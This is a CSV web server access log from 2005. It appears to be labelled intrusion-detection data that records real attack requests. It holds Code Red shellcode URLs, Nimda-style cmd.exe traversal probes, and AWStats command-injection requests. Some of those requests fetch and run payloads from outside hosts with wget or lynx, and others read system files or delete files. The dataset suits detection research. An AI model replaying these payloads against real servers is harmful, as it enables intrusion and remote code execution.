Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-02-24","16:54:26","69.38.46.215","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S548"
"2005-02-24","17:59:59","159.39.19.186","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S25"
"2005-02-24","20:45:10","172.166.225.172","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S38"
"2005-02-24","21:10:51","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1060,"-","-","AC","S21"
"2005-02-24","21:23:18","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:30:37","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:33:47","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:37:50","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:42:31","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:48:05","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","21:48:49","65.96.54.37","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S462"
"2005-02-24","21:57:49","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1060,"-","-","AC","S21"
"2005-02-24","22:03:18","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1059,"-","-","AC","S21"
"2005-02-24","22:12:51","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1060,"-","-","AC","S21"
"2005-02-24","22:19:40","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1060,"-","-","AC","S21"
"2005-02-24","22:31:48","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S21"
"2005-02-24","22:42:59","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S21"
"2005-02-24","22:53:51","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1063,"-","-","AC","S21"
"2005-02-24","23:20:16","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","23:34:44","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-24","23:56:48","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","00:24:39","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","00:51:50","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","01:27:28","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","02:07:00","66.83.68.26","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S487"
"2005-02-25","02:09:19","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","02:46:24","81.6.250.202","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","HTTP/1.0","'404'",1061,"-","-","AA","S575"
"2005-02-25","03:02:31","148.245.28.39","POST","/_vti_bin/_vti_aut/fp30reg.dll","HTTP/1.1","'404'",1062,"-","-","AC","S21"
"2005-02-25","04:21:21","62.0.47.70","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S418"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:38","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:37","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:39","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:37","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:38","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:37","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:37","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:38","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:09:40","220.170.88.36","GET","http://www.yahoo.com/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)","AF","S264"
"2005-02-25","13:34:35","61.10.7.132","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S363"
"2005-02-25","14:18:33","67.104.84.66","GET","/scripts/nsiislog.dll","HTTP/1.1","'404'",1051,"-","-","AA","S491"
"2005-02-25","15:31:41","221.234.48.249","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:42","221.234.48.249","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:44","221.234.48.249","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:45","221.234.48.249","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:47","221.234.48.249","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:48","221.234.48.249","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:50","221.234.48.249","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:52","221.234.48.249","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:53","221.234.48.249","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:55","221.234.48.249","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:56","221.234.48.249","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:31:58","221.234.48.249","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:32:00","221.234.48.249","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S284"
"2005-02-25","15:32:01","221.234.48.249","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S284"
"2005-02-25","15:32:03","221.234.48.249","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","15:32:04","221.234.48.249","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S284"
"2005-02-25","17:16:31","70.183.2.231","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S559"
"2005-02-25","18:16:04","218.24.95.113","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S203"
"2005-02-25","18:33:04","68.209.255.26","GET","/scripts/nsiislog.dll","HTTP/1.1","'404'",1050,"-","-","AA","S519"
"2005-02-25","20:00:49","24.107.54.128","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:49","24.107.54.128","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:50","24.107.54.128","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:50","24.107.54.128","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:50","24.107.54.128","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:51","24.107.54.128","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:51","24.107.54.128","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:51","24.107.54.128","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:52","24.107.54.128","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:52","24.107.54.128","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:52","24.107.54.128","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:53","24.107.54.128","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:53","24.107.54.128","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S325"
"2005-02-25","20:00:53","24.107.54.128","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S325"
"2005-02-25","20:00:54","24.107.54.128","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","20:00:56","24.107.54.128","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S325"
"2005-02-25","22:22:25","218.13.32.15","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S186"
"2005-02-26","01:49:53","172.131.91.78","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S30"
"2005-02-26","02:49:05","61.10.7.79","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S380"
"2005-02-26","04:06:14","81.6.250.202","GET","/scripts/nsiislog.dll","HTTP/1.1","'404'",1050,"-","-","AA","S575"
"2005-02-26","04:36:02","221.15.136.90","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S275"
"2005-02-26","04:38:19","222.166.160.218","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S300"
"2005-02-26","05:29:48","65.122.119.10","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S454"
"2005-02-26","05:41:18","81.5.174.25","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S573"
"2005-02-26","09:23:14","80.63.59.10","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S568"
"2005-02-26","09:57:07","66.134.87.154","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S470"
"2005-02-26","09:58:30","208.51.202.242","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S112"
"2005-02-26","10:13:57","211.162.56.62","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S145"
"2005-02-26","12:23:55","61.147.178.237","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S387"
"2005-02-26","15:25:10","61.157.206.11","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S391"
"2005-02-26","15:25:12","61.157.206.11","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S391"
"2005-02-26","15:25:13","61.157.206.11","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S391"
"2005-02-26","15:25:15","61.157.206.11","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S391"
"2005-02-26","15:25:16","61.157.206.11","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S391"
"2005-02-26","16:34:53","24.119.147.70","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S327"
"2005-02-26","17:12:09","70.17.149.198","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S556"
"2005-02-26","17:55:45","209.115.238.18","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S116"
"2005-02-26","18:57:36","213.135.2.227","GET","/cgi-bin/awstats.pl","HTTP/1.0","'200'",760,"-","-","AK","S162"
"2005-02-26","19:00:38","213.135.2.227","GET","/cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3bwget%20www.shady.go.ro%2faw.tgz%3b%20tar%20zxf%20aw.tgz%3b%20rm%20-f%20aw.tgz%3b%20cd%20.aw%3b%20.%2finetd%20%7c%20","HTTP/1.1","'200'",410,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)","AK","S162"
"2005-02-26","19:01:18","193.109.122.45","CONNECT","193.109.122.67:6668","HTTP/1.0","'405'",982,"-","pxyscand/2.0","AD","S46"
"2005-02-26","19:01:43","82.55.78.243","GET","/cgi-bin/awstats.pl?configdir=%20%7c%20cd%20%2ftmp%3bwget%20www.shady.go.ro%2faw.tgz%3b%20tar%20zxf%20aw.tgz%3b%20rm%20-f%20aw.tgz%3b%20cd%20.aw%3b%20.%2finetd%20%7c%20","HTTP/1.1","'200'",410,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)","AK","S582"
"2005-02-26","19:22:27","68.55.90.67","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:27","68.55.90.67","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:27","68.55.90.67","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:28","68.55.90.67","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:28","68.55.90.67","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:28","68.55.90.67","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:28","68.55.90.67","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:28","68.55.90.67","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:29","68.55.90.67","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:29","68.55.90.67","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:29","68.55.90.67","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:29","68.55.90.67","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:30","68.55.90.67","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S527"
"2005-02-26","19:22:30","68.55.90.67","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S527"
"2005-02-26","19:22:30","68.55.90.67","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","19:22:30","68.55.90.67","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S527"
"2005-02-26","23:50:14","211.161.58.246","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S144"
"2005-02-27","02:00:25","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3buname%20%2da%3bw%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",746,"-","-","AK","S158"
"2005-02-27","02:51:20","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3buname%20%2da%3bw%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",746,"-","-","AK","S158"
"2005-02-27","02:51:32","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcat%20%2fetc%2f%2aissue%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",566,"-","-","AK","S158"
"2005-02-27","02:51:42","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",899,"-","-","AK","S158"
"2005-02-27","02:55:34","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",899,"-","-","AK","S158"
"2005-02-27","02:55:42","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bcurl%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",510,"-","-","AK","S158"
"2005-02-27","02:57:29","202.155.10.139","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S76"
"2005-02-27","02:57:52","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",961,"-","-","AK","S158"
"2005-02-27","02:58:39","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",961,"-","-","AK","S158"
"2005-02-27","02:59:22","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",961,"-","-","AK","S158"
"2005-02-27","02:59:28","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3brm%20%2drf%20t%2a%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",515,"-","-","AK","S158"
"2005-02-27","02:55:57","212.203.66.69","GET","/cgi-bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3blynx%20%2dsource%20www%2eadjud%2ego%2ero%2ft%2etgz%20%3e%20t%2etgz%3bls%20%2dla%3becho%20e_exp%3b%2500","HTTP/1.1","'200'",942,"-","-","AK","S158"
